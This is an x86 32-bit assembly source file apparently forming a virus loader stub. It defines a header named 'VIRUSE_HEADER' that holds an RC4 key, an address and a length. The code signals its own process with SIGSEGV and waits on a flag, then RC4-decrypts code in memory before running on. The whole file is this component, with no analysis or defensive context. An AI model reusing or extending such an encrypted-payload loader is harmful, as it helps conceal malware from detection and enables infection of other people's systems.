BITS 32
%define __NR_KILL	0X25
%define __NR_GETPID	0X14
%define SIGSEGV		11

global loader
global VIRUSE_HEADER

;; -- rc4(char *key, char *value, size_t len_key, size_t len_code ) -- ;;

VIRUSE_HEADER:
	NOP
	NOP
	NOP
	NOP
	NOP
	DB 0X8D, 0X09, 0X1E, 0XE5, 0X23, 0X90, 0X7C, 0XB1, 0X26, 0XA7, 0X14, 0X86, 0X44, 0X94, 0X25, 0X1A ;; Key
	DB 0X5E, 0X58, 0X55, 0X56 ;; Address 
	DB 0X05, 0X00, 0X00, 0X00 ;; SIZE 
	DB 0X00
	DB 0X00

loader:
	
	;; -- /* [START] S initialization */
	NOP
	NOP
	NOP
	NOP
	NOP
		PUSH EBP
		MOV EBP, ESP
		SUB ESP, 0X400
		XOR ECX,ECX
		XOR EDI,EDI
		MOV EDI,0X01
		SHL EDI,0X08

		encrypt.fill:
			MOV [ESP+42+ECX],ECX
			INC ECX
			CMP ECX, EDI
			JNE encrypt.fill
	;; -- /* [END] S initialization */

	;; /* [START] Decryption of the code with the signal */ ;;
	LEA EDI,[REL loader-1]
	MOV EDI,[EDI]
	SHL EDI, 0X18
	SHR EDI, 0X18
	TEST DI,DI
	JE NOT_SIGNAL

		MOV EAX,__NR_GETPID
		INT 0X80

		XCHG EAX,EBX
		mov ECX, SIGSEGV
		mov eax,__NR_KILL
		INT 0X80
		WAIT_VIRUSE:
			LEA EDI,[REL loader-1]
			MOV EDI,[EDI]
			SHL EDI, 0X18
			SHR EDI, 0X18
			CMP DI,0X1
			JE WAIT_VIRUSE
	;; /* [END] Decryption of the code with the signal */ ;;
		
		

	NOT_SIGNAL:
	;; -- /* [START] K initialization */
		;;
		LEA EDX,[REL VIRUSE_HEADER+0X05]		;; KEY

		MOV EDI,0X10

		;; MOV EDX,[EBP+8] 
		;; MOV EDI,[EBP+16]
		MOV ESI,ESP
		ADD ESI,300
		MOV ECX,0X01
		SHL ECX,0X08
		XOR EBX,EBX 
	LOOP_J:
		CMP EBX,EDI
		JL CONTINUE_LOOP  
		XOR EBX,EBX 
	CONTINUE_LOOP: 
		MOV AH, [EDX + EBX]  
		MOV [ESI], AH   
		INC ESI 
		INC EBX
		DEC ECX 
		JNZ LOOP_J 
	;; -- /* [END] K initialization */

	;; -- /* [START] Permutation */ -- ;;
	XOR EDX, EDX
	MOV EDI,ESP
	ADD EDI,42
	XOR EBX,EBX 
	SUB ESI,0X100 
	XOR EAX,EAX 
	MOV ECX,0X100

	LOOP_S: 
		MOV DL,[ESI+EAX] 
		ADD BL,DL 
		MOV DL,[EDI+EAX]
		ADD BL,DL 
		MOV DH,[EDI+EBX] 
		MOV [EDI+EAX],DH 
		MOV [EDI+EBX],DL 
		INC EAX 
		DEC ECX
		JNZ LOOP_S
	;; -- /* [END] Permutation */ -- ;;

	PRGA:
		;;
		LEA ESI,[REL VIRUSE_HEADER+5+0X10]
		MOV ESI,[ESI]
		;;


		MOV EDI,ESP
		ADD EDI,42
		MOV EDX,ESI 
		XOR EAX,EAX
		XOR EBX,EBX
		
		;;
		LEA ECX, [REL VIRUSE_HEADER+0X19]
		MOV ECX, [ECX] 
	CD: 
		PUSH ECX 
		MOVZX ECX,AL
		INC CL
		PUSH EDX
		MOV DH,[EDI+ECX]
		ADD BL,DH
		MOV DL,[EDI+EBX]
		MOV [EDI+ECX],DL
		MOV [EDI+EBX],DH
		ADD DL,DH
		MOVZX EDX,DL
		MOV DL,[EDI+EDX]
		MOV CL,[ESI+EAX]
		XOR CL,DL 
		POP EDX
		MOV [EDX+EAX],CL
		INC EAX
		POP ECX
		DEC ECX
		JNZ CD
		LEAVE
		RET
